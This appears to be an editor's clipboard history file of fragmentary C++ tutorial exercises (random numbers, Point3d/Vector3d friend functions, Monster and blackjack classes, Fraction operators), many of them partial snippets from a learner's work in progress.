	int i = start; i < start + total; i++
32539b23d243aefb0320fe2baa02fb62|file:///home/neo/cplusplus/chapterF/captures.cpp|40|9|V|cpp
	        nums[i] = i * i * rand;
d59f266d3e3c27ee7f2ee9bf69566e2c|file:///home/neo/cplusplus/chapterF/captures.cpp|6|1|V|cpp
	#include <
4142047431f5f974ef182c6f3a4982f6|file:///home/neo/cplusplus/chapterF/captures.cpp|63|24|v|cpp
	guess
1b9b9e0cf1297971dcd6b74cd583fb37|file:///home/neo/cplusplus/chapterF/captures.cpp|77|1|V|cpp
	    std::srand(static_cast<unsigned int>(std::time(nullptr))); // set initial seed value to system clock
0da9fa1ec101fc84393f1403b9c3cbed|file:///home/neo/cplusplus/chapterF/captures.cpp|14|1|V|cpp
	// Generate a random number between min and max (inclusive)
	// Assumes std::srand() has already been called
	// Assumes max - min <= RAND_MAX
262c1f06718952ea488af1cc015b20f2|file:///home/neo/cplusplus/chapterF/captures.cpp|15|38|V|cpp
	    static constexpr double fraction { 1.0 / (RAND_MAX + 1.0) };  // static used for efficiency, so we only calculate this value once
	    // evenly distribute the random number across our range
	    return min + static_cast<int>((max - min + 1) * (std::rand() * fraction));
cf14be7c6e90c6c921e4302a50bd61e8|file:///home/neo/cplusplus/chapter8/q8_2.cpp|16|1|V|cpp
		return 0;
64a69732896c5b69bf7ac7d7ec062e93|file:///home/neo/cplusplus/chapter8/stack.cpp|26|1|V|cpp
		return 0;   
443fbfec0eaaff1e0bbf56cc29093e77|file:///home/neo/cplusplus/chapter8/stack.cpp|6|5|v|cpp
	std::array<int, 
fe5c261c80356ee7314260cb52333fda|file:///home/neo/cplusplus/chapter8/stack.cpp|28|9|v|cpp
	container_type:
3eb1f9410d79d28273ccc045cf8e6478|file:///home/neo/cplusplus/chapter8/stack.cpp|31|9|v|cpp
	size_type
fabcbcd0cdfe3758b952bb2f4460d3ff|file:///home/neo/cplusplus/chapter8/stack.cpp|18|18|v|cpp
	const auto &n: nums
b24d3dad1d20ad180a479cb0907c9ac8|file:///home/neo/cplusplus/chapter8/stack.cpp|28|13|V|cpp
	                return false;
716b8fa8309c6e48f1c550dd347808c3|file:///home/neo/cplusplus/chapter8/stack.cpp|30|1|V|cpp
	            std::cout << "Size: " << m_size << '\n';
4dc67d161ca4a2f7577358f42ea727a5|file:///home/neo/cplusplus/chapter8/q_85_1.cpp|42|1|V|cpp
	    
	    return 0;
	}
d9d7d650613a8ac26f6dfe250d77e8ea|file:///home/neo/cplusplus/chapter8/q_85_1.cpp|41|1|V|cpp
	int main() {
f07685db57c6c07656deaf7253678960|file:///home/neo/cplusplus/chapter8/q_85_1.cpp|6|29|v|cpp
	"black"
43a1437f7f656cd8be7c996c58719e0a|file:///home/neo/cplusplus/chapter8/q_85_1.cpp|7|25|v|cpp
	10.0
7fc02ec5ad52ae675725f35737feca1d|file:///home/neo/cplusplus/chapter8/q_85_1.cpp|14|1|V|cpp
	        Ball(std::string color){
	            m_color = color;
	        }
	
c9a45a490f637c172a317bf119419e52|file:///home/neo/cplusplus/chapter8/q_85_1.cpp|10|1|V|cpp
	        Ball(){ 
	            m_color = "black";
	            m_radius = 10.0;
	        }
	
18c6c8b3310dbfb750cefc88ae640d7d|file:///home/neo/cplusplus/chapter8/q_85a_1.cpp|8|9|v|cpp
	std::uint_fast8_t
a2f2ed4f8ebc2cbb4c21a29dc40ab61d|file:///home/neo/cplusplus/chapter8/vectors.cpp|22|12|v|cpp
	class
323eb93c9723b72aa735e149c25b9610|file:///home/neo/cplusplus/chapter8/vectors.cpp|48|1|V|cpp
		void moveByVector(const Vector3d &v)
47bfa5d73bf8055f1e37e801202f1a9e|file:///home/neo/cplusplus/chapter8/vectors.cpp|4|1|V|cpp
	
	class Point3d{
	    void moveByVector
	};
f4a68fa3603e69dad4798c82a8980de4|file:///home/neo/cplusplus/chapter8/vectors.cpp|27|1|v|cpp
	class Point3d
	{
	private:
		double m_x{};
	    double m_y{};
	    double m_z{};
	 
	public:
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	 
		void moveByVector(const Vector3d &v)
		{
			// implement this function as a friend of class Vector3d
	        m_x += v.m_x;
	        m_y += v.m_y;
	        m_z += v.m_z;
		}
	}
ebebba84717a785415e77c6a96aa7b58|file:///home/neo/cplusplus/chapter8/vectors.cpp|27|1|V|cpp
	class Point3d
	{
	private:
		double m_x{};
	    double m_y{};
	    double m_z{};
	 
	public:
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	 
		void moveByVector(const Vector3d &v)
		{
			// implement this function as a friend of class Vector3d
	        m_x += v.m_x;
	        m_y += v.m_y;
	        m_z += v.m_z;
		}
	};
	 
71f1770878400220c4c07a92470a3549|file:///home/neo/cplusplus/chapter8/vectors.cpp|24|1|V|cpp
		void moveByVector(const Vector3d &v);
		{
			// implement this function as a friend of class Vector3d
	        m_x += v.m_x;
	        m_y += v.m_y;
	        m_z += v.m_z;
		}
2d4c87696f239e66ce4fcfb9dd71074d|file:///home/neo/cplusplus/chapter8/vectors.cpp|25|1|V|cpp
		{
			// implement this function as a friend of class Vector3d
	        m_x += v.m_x;
	        m_y += v.m_y;
	        m_z += v.m_z;
		}
fd8a65f02f325476717d915b29356b02|file:///home/neo/cplusplus/chapter8/vectors.cpp|27|1|V|cpp
	class Vector3d
	{
	private:
		double m_x{};
	    double m_y{};
	    double m_z{};
	 
	public:
		Vector3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Vector(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	
	    friend void Point3d::moveByVector(const Vector3d &v);
	};
8d84578701f583033fa23d81696506be|file:///home/neo/cplusplus/chapter8/Vector3d.h|9|1|V|cpp
		Vector3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Vector(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	
	    friend void Point3d::moveByVector(const Vector3d &v);
3f4d5015a0c8ff676ec1288bca292119|file:///home/neo/cplusplus/chapter8/Vector3d.h|10|1|V|cpp
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
8539ad942d9a493c8dc7fff2bc55e508|file:///home/neo/cplusplus/chapter8/Vector3d.h|12|1|V|cpp
		{
			std::cout << "Vector(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
7636c7feca05d52f62476a8f41519581|file:///home/neo/cplusplus/chapter8/vectors.cpp|3|1|V|cpp
	class Vector3d;
8688571cf77a3892478d2147363a240c|file:///home/neo/cplusplus/chapter8/vectors.cpp|3|1|V|cpp
	class Point3d
	{
	private:
		double m_x{};
	    double m_y{};
	    double m_z{};
	 
	public:
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	 
		void moveByVector(const Vector3d &v);
	};
	 
	
	void Point3d::moveByVector(const Vector3d &v)
	{
	    // implement this function as a friend of class Vector3d
	    m_x += v.m_x;
	    m_y += v.m_y;
	    m_z += v.m_z;
	}
	 
127192456f8ea44c7e402ac4683d00cc|file:///home/neo/cplusplus/chapter8/Point3d.h|11|1|V|cpp
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	 
		void moveByVector(const Vector3d &v);
	};
	 
	
	void Point3d::moveByVector(const Vector3d &v)
	{
	    // implement this function as a friend of class Vector3d
	    m_x += v.m_x;
	    m_y += v.m_y;
	    m_z += v.m_z;
	}
c7d5659ba2a1b7cbc5a4731d5f0df889|file:///home/neo/cplusplus/chapter8/Point3d.cpp|4|1|V|cpp
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		void print() const
		{
			std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
	 
		void moveByVector(const Vector3d &v);
	};
96046390a3ac66c3bdfe5668874bb0d8|file:///home/neo/cplusplus/chapter8/Point3d.cpp|21|1|V|cpp
	void Point3d::moveByVector(const Vector3d &v)
	{
	    // implement this function as a friend of class Vector3d
	    m_x += v.m_x;
	    m_y += v.m_y;
	    m_z += v.m_z;
	}
6fe371bd02e944dbe5109dffa1ef516d|file:///home/neo/cplusplus/chapter8/Point3d.cpp|22|1|V|cpp
		void moveByVector(const Vector3d &v);
74758401943a0216bbff6b5f7ce65041|file:///home/neo/cplusplus/chapter8/Point3d.cpp|15|10|^v|cpp
	Point3d::m
d02805d2620fb4e21e726f97992f6354|file:///home/neo/cplusplus/chapter8/Point3d.h|30|1|V|cpp
	{
	    // implement this function as a friend of class Vector3d
	    m_x += v.m_x;
	    m_y += v.m_y;
	    m_z += v.m_z;
	}
	 
e83a2ab268e8ee342be7a0cb3e4d1dad|file:///home/neo/cplusplus/chapter8/Point3d.h|21|3|V|cpp
		{
			std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
		}
3aee7217149966512ea112e5f10cd2dc|file:///home/neo/cplusplus/chapter8/Point3d.cpp|4|1|V|cpp
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
76bd341436309db3f6384ef31eb7d42c|file:///home/neo/cplusplus/chapter8/Point3d.h|19|1|V|cpp
	 
		Point3d(double x = 0.0, double y = 0.0, double z = 0.0);
1f3f441dc7a444db71f246f190713054|file:///home/neo/cplusplus/chapter8/Vector3d.cpp|4|1|V|cpp
		Vector3d(double x = 0.0, double y = 0.0, double z = 0.0)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
9d96550bbddbaf541049c96509641372|file:///home/neo/cplusplus/chapter8/Vector3d.h|18|1|V|cpp
	 
		Vector3d(double x = 0.0, double y = 0.0, double z = 0.0);
65438e8ae5da5660fb1a1e341118ac36|file:///home/neo/cplusplus/chapter8/Point3d.h|4|1|V|cpp
	#include "Vector3d.h"
cc98ebedcecd55d0ea5e9ccce97fa323|file:///home/neo/cplusplus/chapter8/Point3d.h|24|1|V|cpp
	void Point3d::moveByVector(const Vector3d &v);
5ebfb26322f06cbeb4199b808d0a72ec|file:///home/neo/cplusplus/chapter8/Point3d.cpp|4|1|V|cpp
	class Point3d{
3de1da0a8d3fdb1c97f3a2bb27d52bb2|file:///home/neo/cplusplus/chapter8/Point3d.cpp|12|5|V|cpp
	    // implement this function as a friend of class Vector3d
0ca44ef7ab3c7ddcfeb74b8a549ee5a8|file:///home/neo/cplusplus/chapter8/Vector3d.cpp|3|1|V|cpp
	class Vector3d{
c2263d1768566e9d38feca0b59dbf0ed|file:///home/neo/cplusplus/chapter8/Vector3d.cpp|11|1|V|cpp
	friend void Point3d::moveByVector(const Vector3d &v);
ae067a013e9a390a7312ebe95cfa9086|file:///home/neo/cplusplus/chapter8/Point3d.cpp|1|1|V|cpp
	#include "Point3d.h"
8c79914854768ea693087c65b22fa0bb|file:///home/neo/cplusplus/chapter8/Point3d.h|1|1|V|cpp
	
	2
	3
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
	22
	23
	24
75592d3c9d56023e4e316c11e7a3122d|file:///home/neo/cplusplus/chapter8/Point3d.h|25|1|V|cpp
	#ifdef POINT3D_H
	#define POINT3D_H
	
	class Vector3d;
	
	class Point3d
	{
	    private:
	        double m_x{};
	        double m_y{};
	        double m_z{};
	     
	    public:
	        Point3d(double x = 0.0, double y = 0.0, double z = 0.0)
	            : m_x{x}, m_y{y}, m_z{z}
	        { }
	     
	        void print() const;
	     
	        void moveByVector(const Vector3d &v);
	};
	
	#endif
ce101d1783cf2ae82e90a631e40fe735|file:///home/neo/cplusplus/chapter8/Point3d.cpp|1|1|V|cpp
	#include "Point3d.h"
	#include "Vector3d.h"
	#include <iostream>
	
	void Point3d::print() const
	{
	    std::cout << "Point(" << m_x << " , " << m_y << " , " << m_z << ")\n";
	}
	
	void Point3d::moveByVector(const Vector3d &v)
	{
	    m_x += v.m_x;
	    m_y += v.m_y;
	    m_z += v.m_z;
	}
baa2f033d8c66096b0b84ed4442fce59|file:///home/neo/cplusplus/chapter8/Point2d.cpp|9|5|V|cpp
	        Point2d(){}
199a985ae0c0e2100efb770eef7d96fa|file:///home/neo/cplusplus/chapter8/Point2d.cpp|18|1|V|cpp
	        double distanceTo(Point2d &p){
fb889c2298af2111efb8aa4a814cf1ee|file:///home/neo/cplusplus/chapter8/Point2d.cpp|19|1|V|cpp
	            return std::sqrt((this->m_x - p.m_x) * (this->m_x - p.m_x) + (this->m_y - p.m_y) * (this->m_y - p.m_y));
88f02df0646a337db0df6534d1266a6e|file:///home/neo/cplusplus/chapter8/HelloWorld.cpp|1|1|V|cpp
	
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
	22
	23
	24
	25
	26
	27
	28
	29
	30
	31
	32
	33
e9348129ef19ea9e3f463faa61d1ddfe|file:///home/neo/cplusplus/chapter8/Monster.cpp|3|14|V|cpp
	enum class MonsterType{
	    dragon,
	    goblin,
	    ogre,
	    orc,
	    skeleton,
	    troll,
	    vampire,
	    zombie,
	
	    max_monster_types
	};
1f2ab5a0a651985e89b3db353011e538|file:///home/neo/cplusplus/chapter8/tst.cpp|1|1|V|cpp
	
	1
	2
	3
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
	22
	23
	24
	25
	26
	27
	28
	29
	30
	31
	32
	33
	34
	35
	36
	37
	38
	39
0fc9391bd707991bb17ca91d3d4b0305|file:///home/neo/cplusplus/chapter8/Monster.cpp|35|2|V|cpp
		Monster skeleton{ Monster::Type::skeleton, "Bones", "*rattle*", 4 };
00662ccbe106af434515c8f743b3537a|file:///home/neo/cplusplus/chapter8/Monster.cpp|35|45|v|cpp
	"Bones"
200086f7007a065d62d29014735d4b13|file:///home/neo/cplusplus/chapter8/Monster.cpp|35|51|v|cpp
	"*rattle*"
3c3a1749e56c5a79ba7f71607cd8cd91|file:///home/neo/cplusplus/chapter8/Monster.cpp|48|61|v|cpp
	m_type
bc9a06b4a23712716f5c6de28ede7b28|file:///home/neo/cplusplus/chapter8/Monster.cpp|62|1|V|cpp
	    std::string name{"Bones"};
	    std::string roar{"*rattle*"};
0afd868531f6f11589660a841e05cf22|file:///home/neo/cplusplus/chapter8/Monster.cpp|55|13|V|cpp
	            std::nam
202f6fe7635d3ac0af88e3311a864bc0|file:///home/neo/cplusplus/chapter8/Monster.cpp|68|21|v|cpp
	Monster::Type::skeleton
61995f6d0833f10d5c8122fedaf06a16|file:///home/neo/cplusplus/chapter8/Monster.cpp|65|13|v|cpp
	Monster::Type
cd57cc200dbda5e118c7fe577114c57b|file:///home/neo/cplusplus/chapter8/Monster.cpp|67|13|V|cpp
	            static constexpr std::array s_names{2}
b55c440bc5ee2b7b56980d2377358c5d|file:///home/neo/cplusplus/chapter8/Monster.cpp|69|1|V|cpp
	            std::string name{s_names[getRandomNumber(0, s_names.size() - 1)]};
8b51b52831ffd49a82952d91bcce33c5|file:///home/neo/cplusplus/chapter8/Monster.cpp|71|13|V|cpp
	            std::string roar{"*rattle*"};
b068931cc450442b63f5b3d276ea4297|file:///home/neo/cplusplus/chapter8/Monster.cpp|70|25|v|cpp
	name
a8998c31a141924d06220074fcdc6925|file:///home/neo/cplusplus/chapter8/Monster.cpp|70|32|v|cpp
	names
dde52696c2c979be959e6e644874f513|file:///home/neo/cplusplus/chapter8/Monster.cpp|70|13|v|cpp
	std::string
41767c6e0e422c637af3fd6157c8a678|file:///home/neo/cplusplus/chapter8/Monster.cpp|66|13|V|cpp
	            auto rand_type{static_cast<Monster::Type>(getRandomNumber(0, static_cast<int>(Monster::Type::max_monster_types)))};
4d47f8bfd3d2ff2b4ceba9af69d76053|file:///home/neo/cplusplus/chapter8/Monster.cpp|70|43|v|cpp
	std::array::size_type
b2218117085d7b3886e312b35b7f42fa|file:///home/neo/cplusplus/chapter8/Monster.cpp|69|13|v|cpp
	tuto
0f8d6fb56fe6cdf55ad0114ec5b51dbb|file:///home/neo/cplusplus/chapter8/blackjack.cpp|37|1|v|cpp
	struct
26f730b0015565c8c9861ef7a4c1cda0|file:///home/neo/cplusplus/chapter8/blackjack.cpp|8|13|V|cpp
	/* enum class CardSuit */
	/* { */
	/*   SUIT_CLUB, */
	/*   SUIT_DIAMOND, */
	/*   SUIT_HEART, */
	/*   SUIT_SPADE, */
	 
	/*   MAX_SUITS */
	/* }; */
	 
	/* enum class CardRank */
	/* { */
	/*   RANK_2, */
	/*   RANK_3, */
	/*   RANK_4, */
	/*   RANK_5, */
	/*   RANK_6, */
	/*   RANK_7, */
	/*   RANK_8, */
	/*   RANK_9, */
	/*   RANK_10, */
	/*   RANK_JACK, */
	/*   RANK_QUEEN, */
	/*   RANK_KING, */
	/*   RANK_ACE, */
	 
	/*   MAX_RANKS */
	/* }; */
e3c2c376004ca823e2d0d936b7022c67|file:///home/neo/cplusplus/chapter8/blackjack.cpp|65|1|V|cpp
	/* void printCard(const Card& card) */
	/* { */
	/*   switch (card.rank) */
	/*   { */
	/*   case CardRank::RANK_2: */
	/*     std::cout << '2'; */
	/*     break; */
	/*   case CardRank::RANK_3: */
	/*     std::cout << '3'; */
	/*     break; */
	/*   case CardRank::RANK_4: */
	/*     std::cout << '4'; */
	/*     break; */
	/*   case CardRank::RANK_5: */
	/*     std::cout << '5'; */
	/*     break; */
	/*   case CardRank::RANK_6: */
	/*     std::cout << '6'; */
	/*     break; */
	/*   case CardRank::RANK_7: */
	/*     std::cout << '7'; */
	/*     break; */
	/*   case CardRank::RANK_8: */
	/*     std::cout << '8'; */
	/*     break; */
	/*   case CardRank::RANK_9: */
	/*     std::cout << '9'; */
	/*     break; */
	/*   case CardRank::RANK_10: */
	/*     std::cout << 'T'; */
	/*     break; */
	/*   case CardRank::RANK_JACK: */
	/*     std::cout << 'J'; */
	/*     break; */
	/*   case CardRank::RANK_QUEEN: */
	/*     std::cout << 'Q'; */
	/*     break; */
	/*   case CardRank::RANK_KING: */
	/*     std::cout << 'K'; */
	/*     break; */
	/*   case CardRank::RANK_ACE: */
	/*     std::cout << 'A'; */
	/*     break; */
	/*   default: */
	/*     std::cout << '?'; */
	/*     break; */
	/*   } */
	 
	/*   switch (card.suit) */
	/*   { */
	/*   case CardSuit::SUIT_CLUB: */
	/*     std::cout << 'C'; */
	/*     break; */
	/*   case CardSuit::SUIT_DIAMOND: */
	/*     std::cout << 'D'; */
	/*     break; */
	/*   case CardSuit::SUIT_HEART: */
	/*     std::cout << 'H'; */
	/*     break; */
	/*   case CardSuit::SUIT_SPADE: */
	/*     std::cout << 'S'; */
	/*     break; */
	/*   default: */
	/*     std::cout << '?'; */
	/*     break; */
	/*   } */
	/* } */
	 
	/* int getCardValue(const Card& card) */
	/* { */
	/*   if (card.rank <= CardRank::RANK_10) */
	/*   { */
	/*     return (static_cast<int>(card.rank) + 2); */
	/*   } */
	 
	/*   switch (card.rank) */
	/*   { */
	/*   case CardRank::RANK_JACK: */
	/*   case CardRank::RANK_QUEEN: */
	/*   case CardRank::RANK_KING: */
	/*     return 10; */
	/*   case CardRank::RANK_ACE: */
	/*     return 11; */
	/*   default: */
	/*     assert(false && "should never happen"); */
	/*     return 0; */
	/*   } */
	/* } */
ea8fcc913562ecb1e3d34e8be5fc5eff|file:///home/neo/cplusplus/chapter8/blackjack.cpp|49|16|v|cpp
	const Card& card
6ad4b093436b5baa81630693a0dd2d00|file:///home/neo/cplusplus/chapter8/blackjack.cpp|117|9|v|cpp
	getCardValue
2ef8c5107662cc4e4097ff0c61800119|file:///home/neo/cplusplus/chapter8/blackjack.cpp|121|34|v|cpp
	card.
fc5771912696182e605603ca9951e71d|file:///home/neo/cplusplus/chapter8/blackjack.cpp|280|1|V|cpp
	  /* auto deck{ createDeck() }; */
	 
	  /* shuffleDeck(deck); */
	 
	  /* if (playBlackjack(deck)) */
	  /* { */
	  /*   std::cout << "You win!\n"; */
	  /* } */
	  /* else */
	  /* { */
	  /*   std::cout << "You lose!\n"; */
	  /* } */
	 
	  return 0;
f3e4a6d72936d099a2d469b0273a7a5e|file:///home/neo/cplusplus/chapter8/blackjack.cpp|150|1|V|cpp
	/* using deck_type = std::array<Card, 52>; */
67596b66a3f9ef7e0c27647aeb5175ee|file:///home/neo/cplusplus/chapter8/blackjack.cpp|150|1|V|cpp
	/* using index_type = deck_type::size_type; */
11795774f958cfe584acf71189ed3e05|file:///home/neo/cplusplus/chapter8/blackjack.cpp|153|2|V|cpp
	 
	 
	/* // Maximum score before losing. */
	/* constexpr int maximumScore{ 21 }; */
	 
	/* // Minium score that the dealer has to have. */
	/* constexpr int minimumDealerScore{ 17 }; */
2de3e2aac82b20b28d2dec8620950eb4|file:///home/neo/cplusplus/chapter8/blackjack.cpp|161|1|V|cpp
	/* void printDeck(const deck_type& deck) */
	/* { */
	/*   for (const auto& card : deck) */
	/*   { */
	/*     printCard(card); */
	/*     std::cout << ' '; */
	/*   } */
	 
	/*   std::cout << '\n'; */
	/* } */
3cb68779bb5ddeda06ff3a7333c59610|file:///home/neo/cplusplus/chapter8/blackjack.cpp|153|20|v|cpp
	const deck_type& deck
30f88a48fc107c3807564d71dc654ee6|file:///home/neo/cplusplus/chapter8/blackjack.cpp|172|1|V|cpp
	/* deck_type createDeck() */
	/* { */
	/*   deck_type deck{}; */
	 
	/*   index_type card{ 0 }; */
	 
	/*   auto suits{ static_cast<index_type>(CardSuit::MAX_SUITS) }; */
	/*   auto ranks{ static_cast<index_type>(CardRank::MAX_RANKS) }; */
	 
	/*   for (index_type suit{ 0 }; suit < suits; ++suit) */
	/*   { */
	/*     for (index_type rank{ 0 }; rank < ranks; ++rank) */
	/*     { */
	/*       deck[card].suit = static_cast<CardSuit>(suit); */
	/*       deck[card].rank = static_cast<CardRank>(rank); */
	/*       ++card; */
	/*     } */
	/*   } */
	 
	/*   return deck; */
	/* } */
c8432259842c85f4a36dceff472dc502|file:///home/neo/cplusplus/chapter8/blackjack.cpp|152|1|V|cpp
	deck_type createDeck()
3e21dd7ecabd5782df20d2149076604e|file:///home/neo/cplusplus/chapter8/blackjack.cpp|154|1|V|cpp
	  deck_type deck{};
80588c69e29581ea3b8efd13da98caff|file:///home/neo/cplusplus/chapter8/blackjack.cpp|154|1|V|cpp
	 
	  index_type card{ 0 };
	 
	  auto suits{ static_cast<index_type>(CardSuit::MAX_SUITS) };
	  auto ranks{ static_cast<index_type>(CardRank::MAX_RANKS) };
	 
	  for (index_type suit{ 0 }; suit < suits; ++suit)
	  {
	    for (index_type rank{ 0 }; rank < ranks; ++rank)
	    {
	      deck[card].suit = static_cast<CardSuit>(suit);
	      deck[card].rank = static_cast<CardRank>(rank);
	      ++card;
	    }
4f4884d130af6e7209a0006213dc0746|file:///home/neo/cplusplus/chapter8/blackjack.cpp|160|41|V|cpp
	              deck[card].suit = static_cast<CardSuit>(suit);
	              deck[card].rank = static_cast<CardRank>(rank);
89ca4ad95cd1cd9e1726c768962f626a|file:///home/neo/cplusplus/chapter8/blackjack.cpp|160|33|v|cpp
	static_cast<CardSuit>(suit);
761f4c16233bf6f897a50c17896ca5ee|file:///home/neo/cplusplus/chapter8/blackjack.cpp|161|33|v|cpp
	static_cast<CardRank>(rank);
a8777fb1ef466544cbcab6ebfd2cace0|file:///home/neo/cplusplus/chapter8/blackjack.cpp|159|86|v|cpp
	;rank
f4a554496fbbe4240766749d00c0c2f5|file:///home/neo/cplusplus/chapter8/blackjack.cpp|160|32|V|cpp
	              deck[card].suit = 
	              deck[card].rank = 
0ba09d7cc993780799b611179f8fbf87|file:///home/neo/cplusplus/chapter8/blackjack.cpp|162|1|V|cpp
	 
	/*   return deck; */
	/* } */
e895873786a9b8587049d3151174085c|file:///home/neo/cplusplus/chapter8/blackjack.cpp|153|9|V|cpp
	        Deck(){
	          index_type card{ 0 };
	          auto suits{ static_cast<index_type>(Card::CardSuit::MAX_SUITS) };
	          auto ranks{ static_cast<index_type>(Card::CardRank::MAX_RANKS) };
	          for (index_type suit{ 0 }; suit < suits; ++suit) {
	            for (index_type rank{ 0 }; rank < ranks; ++rank) {
	                m_deck[card] = {static_cast<Card::CardSuit>(suit), static_cast<Card::CardRank>(rank)};
	                ++card;
	            }
	          }
	        }
c5e80c666b224f12edf02cba1b9dc7bb|file:///home/neo/cplusplus/chapter8/blackjack.cpp|171|51|v|cpp
	Suit
021da1b20f73dc252361a54d80497ef3|file:///home/neo/cplusplus/chapter8/blackjack.cpp|171|86|v|cpp
	Rank
65dc5d2a03aac87b199cba2986986d05|file:///home/neo/cplusplus/chapter8/blackjack.cpp|171|92|v|cpp
	rank
581451ea3068431fd2a5c77fd8b15379|file:///home/neo/cplusplus/chapter8/blackjack.cpp|164|1|V|cpp
	        Deck(){
	          index_type card{ 0 };
	          auto suits{ static_cast<index_type>(Card::CardSuit::MAX_SUITS) };
	          auto ranks{ static_cast<index_type>(Card::CardRank::MAX_RANKS) };
	          for (index_type suit{ 0 }; suit < suits; ++suit) {
	            for (index_type rank{ 0 }; rank < ranks; ++rank) {
	                m_deck[card] = {static_cast<Card::CardRank>(rank), static_cast<Card::CardSuit>(suit)};
	                ++card;
	            }
	          }
	        }
bb01e6e327d1a0f749092d329f6e3e5f|file:///home/neo/cplusplus/chapter8/blackjack.cpp|54|9|V|cpp
	        Card() = default;
e67f517d47023b79eb55eb1958f4b9df|file:///home/neo/cplusplus/chapter8/blackjack.cpp|180|1|V|cpp
	/* void shuffleDeck(deck_type& deck) */
	/* { */
	/*   static std::mt19937 mt{ static_cast<std::mt19937::result_type>(std::time(nullptr)) }; */
	 
	/*   std::shuffle(deck.begin(), deck.end(), mt); */
	/* } */
fb53cee88355f117111eca98ad4565cf|file:///home/neo/cplusplus/chapter8/blackjack.cpp|171|22|v|cpp
	deck_type& deck
895788fd363e60bf1584292a617f102b|file:///home/neo/cplusplus/chapter8/blackjack.cpp|234|32|V|cpp
	        player.score() += deck.dealCard()
	            getCardValue(deck[nextCardIndex++]);
c6aa283c533ead1ef28b22b9369e760d|file:///home/neo/cplusplus/chapter8/blackjack.cpp|228|9|v|cpp
	player.score() > maximumScore
00bfe4bc6561e4a6d3c806595b7c58f8|file:///home/neo/cplusplus/chapter8/blackjack.cpp|244|17|v|cpp
	const deck_type
d0bf7de97309b0ebfa89d9307b607b2e|file:///home/neo/cplusplus/chapter8/blackjack.cpp|244|29|v|cpp
	index_type
07ec89253894d1853ea0dec55d56c093|file:///home/neo/cplusplus/chapter8/blackjack.cpp|244|29|v|cpp
	2W nextCardIndex, 
081cfc7707b0994f9ef35e4881624d7c|file:///home/neo/cplusplus/chapter8/blackjack.cpp|249|5|V|cpp
	    dealer.score += getCardValue(deck[nextCardIndex++]);
54d16183f299dec7a8f1a3fa5a99059c|file:///home/neo/cplusplus/chapter8/blackjack.cpp|249|10|v|cpp
	(dealer.score > maximumScore);
e55caf86d04dc9fbd799eb1e2d6f9730|file:///home/neo/cplusplus/chapter8/blackjack.cpp|253|3|V|cpp
	  index_type nextCardIndex{ 0 };
d0001e0d3773d74ae3f5047b78c8c45e|file:///home/neo/cplusplus/chapter8/blackjack.cpp|253|17|v|cpp
	 getCardValue(deck[nextCardIndex++]) 
e7d3dc6f589d20423d5fad85642573ac|file:///home/neo/cplusplus/chapter8/blackjack.cpp|258|17|v|cpp
	 getCardValue(deck[nextCardIndex]) + getCardValue(deck[nextCardIndex + 1]) 
73e4bed161d2de4c626d50fdd427cf4f|file:///home/neo/cplusplus/chapter8/blackjack.cpp|259|1|V|cpp
	  player.drawCard(deck);
be7b13de85a3211e694bff5f656285fb|file:///home/neo/cplusplus/chapter8/blackjack.cpp|261|3|V|cpp
	  nextCardIndex += 2;
fcd49cdb1aa94f9a43f1c397a192b361|file:///home/neo/cplusplus/chapter8/blackjack.cpp|262|23|v|cpp
	 nextCardIndex,
f3c276523e61cc41c073527178397d50|file:///home/neo/cplusplus/chapter8/blackjack.cpp|266|24|v|cpp
	nextCardIndex, 
d1090901f27ea3d48c9625c68f8cc3b4|file:///home/neo/cplusplus/chapter9/Fraction.cpp|20|5|V|cpp
	    Fraction f1{ 1, 4 };
	    f1.print();
	 
	    Fraction f2{ 1, 2 };
	    f2.print();
	
02abc18c3b46fbd7cfee6bbcd0986b79|file:///home/neo/cplusplus/chapter9/Fraction.cpp|38|1|V|cpp
	    return 0;
66d5e7c1ef50a147debff882dd3e02e4|file:///home/neo/cplusplus/chapter9/Fraction.cpp|19|1|V|cpp
	Fraction operator+)
a3192536c5c27db6b74276852c533167|file:///home/neo/cplusplus/chapter9/Fraction.cpp|16|1|V|cpp
	        friend Fraction operator+(const Fraction &f1, const Fraction &f2);
e4d1651ff30ccf511dd484b9b11a7c90|file:///home/neo/cplusplus/chapter9/Fraction.cpp|16|1|V|cpp
	        friend Fraction operator*(const Fraction &f1, const Fraction &f2);
57ced0a3b18a64d8167eeaef9a759201|file:///home/neo/cplusplus/chapter9/Fraction.cpp|17|55|v|cpp
	const Fraction &f2
